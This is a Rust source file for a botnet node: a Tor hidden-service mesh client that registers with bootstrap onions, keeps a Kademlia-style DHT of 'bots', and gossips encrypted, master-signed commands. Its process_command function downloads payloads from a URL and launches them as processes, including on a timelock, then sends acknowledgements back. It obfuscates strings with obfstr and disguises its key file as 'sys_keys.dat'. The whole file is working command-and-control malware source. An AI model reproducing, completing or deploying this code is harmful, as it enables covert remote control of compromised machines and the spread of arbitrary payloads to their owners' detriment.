use std::time::Duration;
use obfstr::obfstr;
use std::sync::Arc;
use tokio::sync::RwLock;
use tokio::time;
use lru::LruCache;
use std::num::NonZeroUsize;
use protocol::{MeshMsg, PeerInfo, GhostPacket, CommandPayload, GossipMsg, Registration};
use crate::common::crypto::load_or_generate_keys;
use crate::utils::paths::get_appdata_dir;
use crate::p2p::transport::ActivePool;
use crate::p2p::dht::RoutingTable;
use arti_client::{TorClient, TorClientConfig};
use tor_rtcompat::PreferredRuntime;
use rand::seq::SliceRandom;
use futures_util::{SinkExt, StreamExt};
use tokio_tungstenite::{accept_async, client_async, tungstenite::Message};

struct MeshState {
    dht: RoutingTable,
    pool: ActivePool,
    seen_messages: LruCache<String, i64>,
    my_onion: String,
}

pub async fn start_client() -> Result<(), Box<dyn std::error::Error>> {
    println!("{}", obfstr!("Starting Tor Mesh Node (Arti Native)..."));
    
    // 1. Identity
    let key_path = get_appdata_dir().join("sys_keys.dat");
    let identity = load_or_generate_keys(key_path);
    let my_pub_hex = identity.pub_hex.clone();
    
    // 2. Bootstrapping Tor
    let config = TorClientConfig::default();
    let tor_client = TorClient::create_bootstrapped(config).await?;
    
    // 3. Launch Hidden Service (REAL)
    println!("{}", obfstr!("Launching Onion Service..."));
    // Create an ephemeral nickname for this session
    let svc_nickname = format!("node-{}", &my_pub_hex[0..8]);
    
    use arti_client::config::onion_service::OnionServiceConfigBuilder;
    let svc_config = OnionServiceConfigBuilder::default()
        .nickname(svc_nickname.parse().unwrap()) 
        .build()?;
    
    // Launch
    let (service_handle, mut stream) = tor_client.launch_onion_service(svc_config)?.expect("Onion launch returned None");
    
    // Get the Real Onion Address
    let my_onion = if let Some(id) = service_handle.onion_address() {
        // Use Debug format as fallback since Display is missing for HsId
        format!("{:?}.onion", id).replace("HsId(", "").replace(")", "")
    } else {
        return Err("Failed to get onion address".into());
    };
    
    println!("{}: {}", obfstr!("Hidden Service Active"), my_onion);

    let state = Arc::new(RwLock::new(MeshState {
        dht: RoutingTable::new(&my_onion),
        pool: ActivePool::new(),
        seen_messages: LruCache::new(NonZeroUsize::new(1000).unwrap()),
        my_onion: my_onion.clone(),
    }));

    // Register...
    use crate::common::constants::BOOTSTRAP_ONIONS;
    println!("{}", obfstr!("Registering with Bootstrap Swarm (Failover Mode)..."));
    
    let mut bootstrap_success = false;
    while !bootstrap_success {
        for onion_addr in BOOTSTRAP_ONIONS.iter() {
            println!("{}: {}", obfstr!("Attempting Bootstrap"), onion_addr);
            if let Ok(_) = register_via_tor(&tor_client, &state, onion_addr, &my_pub_hex, &my_onion, &identity.keypair).await {
                println!("{}: {}", obfstr!("Bootstrap Success via"), onion_addr);
                bootstrap_success = true;
                break;
            } else {
                eprintln!("{}: {}", obfstr!("Bootstrap Failed via"), onion_addr);
            }
        }
        
        if !bootstrap_success {
            eprintln!("{}", obfstr!("CRITICAL: All Bootstrap Nodes Unreachable. Retrying in 60s..."));
            time::sleep(Duration::from_secs(60)).await;
        }
    }

    let state_clone = state.clone();
    let tor_clone = tor_client.clone();
    
    // Spawn Service Listener (Inbound)
    tokio::spawn(async move {
        println!("{}", obfstr!("Listening for Inbound Gossip..."));
        while let Some(rend_req) = stream.next().await {
            let req: tor_hsservice::RendRequest = rend_req;
            
            // Accept the rendezvous (Session)
            let mut session_stream = match req.accept().await {
                Ok(s) => s,
                Err(e) => {
                     eprintln!("{}: {}", obfstr!("Failed to accept rendezvous"), e);
                     continue;
                }
            };
            
            let state_inner = state_clone.clone();
            let tor_inner = tor_clone.clone();
            
            // Handle Session Streams
            tokio::spawn(async move {
                while let Some(stream_req) = session_stream.next().await {
                     // stream_req is StreamRequest
                     let data_req = stream_req;
                     
                     // Accept the Data Stream using Empty Connected message
                     use tor_cell::relaycell::msg::Connected;
                     
                     let data_stream = match data_req.accept(Connected::new_empty()).await {
                         Ok(s) => s,
                         Err(e) => {
                             eprintln!("{}: {}", obfstr!("Failed to accept data stream"), e);
                             continue;
                         }
                     };
                     
                     let s_inner = state_inner.clone();
                     let t_inner = tor_inner.clone();
                     tokio::spawn(async move {
                         handle_inbound_connection(data_stream, s_inner, t_inner).await;
                     });
                }
            });
        }
    });

    // 6. Maintenance Loop (Self-Lookup & Keep-Alive)
    // "Bot A executes FIND_BOT(Target = My_ID)" periodically
    let state_maint = state.clone();
    let tor_maint = tor_client.clone();
    let me = my_onion.clone();
    
    tokio::spawn(async move {
        loop {
            // Self-Lookup every 60s
            time::sleep(Duration::from_secs(60)).await;
            perform_lookup(&state_maint, &tor_maint, &me).await;
        }
    });

    // Main thread sleep
    loop {
        time::sleep(Duration::from_secs(3600)).await;
    }
}

use x25519_dalek::{EphemeralSecret, PublicKey};
use rand_core::OsRng;

async fn handle_inbound_connection(
    stream: arti_client::DataStream, 
    state: Arc<RwLock<MeshState>>, 
    tor: TorClient<PreferredRuntime>
) {
    let mut ws_stream = match accept_async(stream).await {
        Ok(ws) => ws,
        Err(_) => return, // Connection handshake failed
    };
    
    let mut session_key: Option<Vec<u8>> = None;
    
    // Inbound Connection Handling
    
    while let Some(msg) = ws_stream.next().await {
        if let Ok(Message::Text(text)) = msg {
            // V10 Protocol: Try to parse generic MeshMsg first
            if let Ok(mesh_msg) = serde_json::from_str::<MeshMsg>(&text) {
                match mesh_msg {
                    MeshMsg::ClientHello { ephemeral_pub } => {
                        // 1. Generate My Ephemeral Key
                        let mut rng = OsRng;
                        let my_secret = EphemeralSecret::random_from_rng(&mut rng);
                        let my_public = PublicKey::from(&my_secret);
                        
                        // 2. Derive Shared Secret
                        if let Ok(peer_bytes) = hex::decode(ephemeral_pub) {
                            let peer_arr_res: Result<[u8; 32], _> = peer_bytes.try_into();
                            if let Ok(peer_arr) = peer_arr_res {
                                let peer_public = PublicKey::from(peer_arr);
                                let shared_secret = my_secret.diffie_hellman(&peer_public);
                                session_key = Some(shared_secret.as_bytes().to_vec());
                                
                                // 3. Reply ServerHello
                                let resp = MeshMsg::ServerHello { 
                                    ephemeral_pub: hex::encode(my_public.as_bytes()) 
                                };
                                let resp_json = serde_json::to_string(&resp).unwrap_or_default();
                                let _ = ws_stream.send(Message::Text(resp_json.into())).await;
                                println!("{}", obfstr!("Handshake Success. Session Key Established."));
                            }
                        }
                    },
                    MeshMsg::Gossip(gossip) => {
                         // Pass session_key if present
                         handle_gossip(state.clone(), gossip, &tor, session_key.as_deref()).await;
                    },
                    MeshMsg::FindBot { target_id } => {
                         // Reply with closest peers
                         let closest = {
                             let guard = state.read().await;
                             guard.dht.get_closest_peers(&target_id, 5) // Return 5 neighbors
                         };
                         let resp = MeshMsg::FoundBot { nodes: closest };
                         let resp_json = serde_json::to_string(&resp).unwrap_or_default();
                         let _ = ws_stream.send(Message::Text(resp_json.into())).await;
                    },
                    MeshMsg::FoundBot { nodes } => {
                        // Add to DHT via Safe Ping
                         for node in nodes {
                             insert_node_safe(state.clone(), tor.clone(), node).await;
                         }
                    },
                    _ => {} // Register/GetPeers handled by Bootstrap not Node
                }
            } 
            // Fallback / Legacy (Direct GossipMsg)
            else if let Ok(gossip) = serde_json::from_str::<GossipMsg>(&text) {
                 handle_gossip(state.clone(), gossip, &tor, None).await;
            }
        }
    }
}

async fn register_via_tor(
    tor: &TorClient<PreferredRuntime>,
    state: &Arc<RwLock<MeshState>>,
    bootstrap_onion: &str,
    my_pub: &str,
    my_onion: &str,
    signing_key: &ed25519_dalek::SigningKey
) -> Result<(), Box<dyn std::error::Error>> {
    let target_url = format!("ws://{}/register", bootstrap_onion);
    let (host, port) = if let Some(idx) = bootstrap_onion.find(':') {
        (&bootstrap_onion[0..idx], bootstrap_onion[idx+1..].parse::<u16>().unwrap_or(80))
    } else {
        (bootstrap_onion, 80)
    };
    
    let stream = tor.connect((host.to_string(), port)).await?;
    let (mut ws_stream, _) = client_async(target_url, stream).await?;
    
    let sig_data = format!("Register:{}", my_onion);
    use ed25519_dalek::Signer;
    let signature = hex::encode(signing_key.sign(sig_data.as_bytes()).to_bytes());
    
    // Solve PoW
    let pow_nonce = solve_pow(my_pub);
    
    let reg = Registration {
        pub_key: my_pub.to_string(),
        onion_address: my_onion.to_string(),
        signature,
        pow_nonce,
        timestamp: chrono::Utc::now().timestamp(),
    };
    
    let msg = MeshMsg::Register(reg);
    let json = serde_json::to_string(&msg)?;
    ws_stream.send(Message::Text(json.into())).await?;
    
    if let Some(Ok(Message::Text(resp_text))) = ws_stream.next().await {
        if let Ok(MeshMsg::Peers(peers)) = serde_json::from_str::<MeshMsg>(&resp_text) {
            for p in peers {
                insert_node_safe(state.clone(), tor.clone(), p).await;
            }
            let guard = state.read().await;
            println!("{}: {} {}", obfstr!("Bootstrap Success. DHT Initialized with"), guard.dht.all_peers().len(), obfstr!("peers."));
        }
    }
    
    Ok(())
}

async fn handle_gossip(state: Arc<RwLock<MeshState>>, msg: GossipMsg, tor: &TorClient<PreferredRuntime>, session_key_override: Option<&[u8]>) {
    // 1. Check Cache
    let mut is_seen = false;
    {
        let mut guard = state.write().await;
        if guard.seen_messages.contains(&msg.id) { is_seen = true; }
        else { guard.seen_messages.put(msg.id.clone(), chrono::Utc::now().timestamp()); }
    }
    if is_seen { return; }

    let swarm_key_hex = env!("SWARM_KEY");
    let swarm_key = hex::decode(swarm_key_hex).unwrap_or(vec![0u8; 32]);
    
    // Determine which key to use for decryption
    let decryption_key = session_key_override.unwrap_or(&swarm_key);
    
    // 2. Decrypt & Exec
    if let Some(cmd) = packet_verify_and_decrypt(&msg.packet, decryption_key) {
        // Secure Time Check (NTP)
        let now = get_secure_time().await;
        
        // Allow 30s drift
        if cmd.execute_at <= now + 30 {
             process_command(&cmd);
             if let Some(reply_to) = &cmd.reply_to {
                 let t = tor.clone();
                 let r = reply_to.clone();
                 let i = cmd.id.clone();
                 tokio::spawn(async move {
                     send_ack(&t, &r, &i, "Executed").await;
                 });
             }
        } else {
             println!("{}: {}", obfstr!("Timelocked"), cmd.execute_at);
             let reply_to = cmd.reply_to.clone();
             let t = tor.clone();
             let i = cmd.id.clone();
             let cmd_clone = cmd.clone();
             tokio::spawn(async move {
                 let wait_s = if cmd_clone.execute_at > now { (cmd_clone.execute_at - now) as u64 } else { 0 };
                 time::sleep(Duration::from_secs(wait_s)).await;
                 process_command(&cmd_clone);
                 if let Some(r) = reply_to {
                     send_ack(&t, &r, &i, "Executed").await;
                 }
             });
        }
        
        // 3. Propagation (Gossip + DHT)
        if msg.ttl > 0 {
            // Re-Encrypt if we used a specific Session Key (Injection)
            let packet_to_send = if session_key_override.is_some() {
                // Re-Encrypt with Swarm Key for neighbors
                use chacha20poly1305::{ChaCha20Poly1305, Key, KeyInit, AeadCore};
                use chacha20poly1305::aead::Aead; // Import Trait
                use base64::{Engine as _, engine::general_purpose::STANDARD as BASE64};
                
                let cipher = ChaCha20Poly1305::new(Key::from_slice(&swarm_key));
                let nonce = ChaCha20Poly1305::generate_nonce(&mut OsRng);
                let json = serde_json::to_string(&cmd).unwrap(); // Plaintext
                let ciphertext = cipher.encrypt(&nonce, json.as_bytes()).expect("Re-Encryption Failed");
                
                GhostPacket {
                    ciphertext: BASE64.encode(ciphertext),
                    nonce: BASE64.encode(nonce),
                    signature: msg.packet.signature.clone(), // Reuse Sig (Valid for Plaintext)
                }
            } else {
                msg.packet.clone() // Forward as is
            };
            
            let targets = {
                let guard = state.read().await;
                guard.dht.all_peers()
            };
            
            let selected = select_gossip_target_list(targets);
            println!("{}: {} {}", obfstr!("Gossip Fanout"), selected.len(), obfstr!("peers"));
            
            let next_msg = GossipMsg { 
                id: msg.id,
                packet: packet_to_send,
                ttl: msg.ttl - 1 
            };
            let msg_str = serde_json::to_string(&next_msg).unwrap();
            
            let mut guard = state.write().await;
            let neighbors: Vec<String> = guard.dht.all_peers().iter().map(|p| p.onion_address.clone()).collect();
            
            for target_peer in selected {
                let _ = guard.pool.send_msg(tor, &target_peer.onion_address, msg_str.clone(), &neighbors).await;
            }
        }
    } else {
        return; // Invalid
    }
}

async fn perform_lookup(state: &Arc<RwLock<MeshState>>, tor: &TorClient<PreferredRuntime>, target_onion: &str) {
    // "FIND_BOT(Target)" implementation
    // 1. Get alpha=2 closest peers from local DHT
    let closest = {
        let guard = state.read().await;
        guard.dht.get_closest_peers(target_onion, 2)
    };
    // "Bot A executes FIND_BOT(Target = My_ID)"
    // We query alpha=2 closest peers to announce ourselves and maintain the DHT.
    // This traffic keeps the circuits alive and updates neighbor routing tables.
    
    let mut guard = state.write().await;
    let find_msg = MeshMsg::FindBot { target_id: target_onion.to_string() }; // V10: Find Myself
    let msg_str = serde_json::to_string(&find_msg).unwrap(); // Use MeshMsg, not raw text
    
    // Anti-Eviction: Protect Neighbors
    let neighbors: Vec<String> = guard.dht.all_peers().iter().map(|p| p.onion_address.clone()).collect();
    
    for peer in closest {
         let _ = guard.pool.send_msg(tor, &peer.onion_address, msg_str.clone(), &neighbors).await;
    }
}

async fn get_secure_time() -> i64 {
    // 1. Attempt NTP sync (UDP 123)
    let ntp_res = tokio::task::spawn_blocking(|| {
        let socket = std::net::UdpSocket::bind("0.0.0.0:0").ok()?;
        socket.set_read_timeout(Some(Duration::from_secs(3))).ok()?; // Fast fail 3s
        match sntpc::simple_get_time("pool.ntp.org:123", &socket) {
            Ok(t) => {
                let ntp_sec = t.sec();
                let unix_sec = ntp_sec as i64 - 2_208_988_800;
                Some(unix_sec)
            },
            Err(_) => None,
        }
    }).await;
    
    if let Ok(Some(ntp_time)) = ntp_res {
        return ntp_time;
    }
    
    obfstr!("[-] NTP Failed. Attempting HTTP Time Sync...");

    // 2. HTTP Fallback (TCP 80/443) - Bypass UDP blocking
    // Google or Facebook (High availability, trusted Date header)
    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(5))
        .build()
        .unwrap_or_default();

    let targets = vec!["https://www.google.com", "https://www.facebook.com"];
    
    for target in targets {
         if let Ok(resp) = client.head(target).send().await {
             if let Some(date_header) = resp.headers().get("Date") {
                 if let Ok(date_str) = date_header.to_str() {
                     // RFC 2822 format: "Sun, 06 Nov 1994 08:49:37 GMT"
                     if let Ok(parsed) = chrono::DateTime::parse_from_rfc2822(date_str) {
                         println!("{}: {} ({})", obfstr!("[+] Time Synced via HTTP"), target, obfstr!(""));
                         return parsed.timestamp();
                     }
                 }
             }
         }
    }

    // 3. Last Resort: System Time
    obfstr!("[-] All Sync Methods Failed. Using System Time.");
    chrono::Utc::now().timestamp()
}

fn select_gossip_target_list(peers: Vec<PeerInfo>) -> Vec<PeerInfo> {
    let total = peers.len();
    if total == 0 { return vec![]; }
    
    let target_count = if total < 10 {
        total
    } else {
        (total as f32 * 0.3).ceil() as usize
    };
    
    let mut rng = rand::thread_rng();
    peers.choose_multiple(&mut rng, target_count).cloned().collect()
}

fn packet_verify_and_decrypt(packet: &GhostPacket, key: &[u8]) -> Option<CommandPayload> {
    let payload = packet.decrypt(key)?;
    let master_pub_hex = env!("MASTER_PUB_KEY"); 
    let json = serde_json::to_string(&payload).ok()?;
    if protocol::verify_signature(master_pub_hex, json.as_bytes(), &packet.signature) {
        Some(payload)
    } else {
        None
    }
}

fn process_command(cmd: &CommandPayload) {
    println!("{}: {} [{}]", obfstr!("EXECUTING"), cmd.action, cmd.id);

    match cmd.action.as_str() {
        "LOAD_MODULE" => {
            // LOAD_MODULE|URL|NAME
            let parts: Vec<&str> = cmd.parameters.split('|').collect();
            if parts.len() >= 2 {
                let url = parts[0];
                let name = parts[1];
                println!("{}: {} from {}", obfstr!("Loading Module"), name, url);
                
                let url_owned = url.to_string();
                let name_owned = name.to_string();
                
                tokio::spawn(async move {
                    if let Err(e) = crate::modules::loader::download_payload(&url_owned, &name_owned).await {
                         eprintln!("Load Failed: {}", e);
                    }
                });
            }
        },
        "START_MODULE" => {
            // START_MODULE|NAME|ARGS
            let parts: Vec<&str> = cmd.parameters.split('|').collect();
            if parts.len() >= 1 {
                let name = parts[0];
                let args = if parts.len() > 1 { parts[1..].join(" ") } else { "".to_string() };
                println!("{}: {}", obfstr!("Starting Module"), name);
                
                let name_owned = name.to_string();
                let args_owned = args;
                
                tokio::spawn(async move {
                     // execute_payload is synchronous (launching process)
                     if let Err(e) = crate::modules::loader::execute_payload(&name_owned, &args_owned) {
                         eprintln!("Start Failed: {}", e);
                     }
                });
            }
        },
        "STOP_MODULE" => {
             let name = cmd.parameters.trim();
             println!("{}: {}", obfstr!("Stopping Module"), name);
             if !name.is_empty() {
                 let name_owned = name.to_string();
                 tokio::spawn(async move {
                     if let Err(e) = crate::modules::loader::stop_payload(&name_owned) {
                         eprintln!("Stop Failed: {}", e);
                     }
                 });
             }
        },
        "KILL_BOT" => {
            println!("{}", obfstr!("Received KILL command. Exiting."));
            std::process::exit(0);
        },
        _ => {
            println!("{}: {}", obfstr!("Unknown Command"), cmd.action);
        }
    }
}

fn solve_pow(pub_key: &str) -> u64 {
    use sha2::{Sha256, Digest};
    let mut nonce: u64 = 0;
    obfstr!("[*] Solving PoW (Constraint: 4 Hex Zeros)...");
    let start = std::time::Instant::now();
    loop {
        let input = format!("{}{}", pub_key, nonce);
        let hash = Sha256::digest(input.as_bytes());
        if hash[0] == 0 && hash[1] == 0 {
            let dur = start.elapsed();
            println!("[+] PoW Solved in {:?}. Nonce: {}", dur, nonce);
            return nonce;
        }
        nonce += 1;
    }
}

async fn insert_node_safe(state: Arc<RwLock<MeshState>>, tor: TorClient<PreferredRuntime>, new_peer: PeerInfo) {
    let action = {
        let mut guard = state.write().await;
        guard.dht.insert(new_peer.clone())
    };
    
    if let crate::p2p::dht::InsertResult::BucketFull(old) = action {
        tokio::spawn(async move {
            if !check_alive(&tor, &old.onion_address).await {
                let mut guard = state.write().await;
                guard.dht.evict_and_insert(&old.onion_address, new_peer);
            }
        });
    }
}

async fn check_alive(tor: &TorClient<PreferredRuntime>, onion: &str) -> bool {
    let target_host = if let Some(idx) = onion.find(':') {
        &onion[0..idx]
    } else {
        onion
    };
    let target_port = 80; // Default Mesh Port
    
    // Just try to connect
    match tor.connect((target_host.to_string(), target_port)).await {
        Ok(_) => true,
        Err(_) => false,
    }
}

async fn send_ack(tor: &TorClient<PreferredRuntime>, target_onion: &str, cmd_id: &str, status: &str) {
    let target_host = if let Some(idx) = target_onion.find(':') {
        &target_onion[0..idx]
    } else {
        target_onion
    };
    let target_port = 80;

    if let Ok(stream) = tor.connect((target_host.to_string(), target_port)).await {
        let url = format!("ws://{}/ack", target_onion);
        if let Ok((mut ws_stream, _)) = client_async(url, stream).await {
             let ack = MeshMsg::Ack(protocol::AckPayload {
                 command_id: cmd_id.to_string(),
                 status: status.to_string(),
                 details: obfstr!("Ack from Bot").to_string(),
             });
             if let Ok(json) = serde_json::to_string(&ack) {
                 let _ = ws_stream.send(Message::Text(json.into())).await;
                 let _ = ws_stream.close(None).await;
             }
        }
    }
}
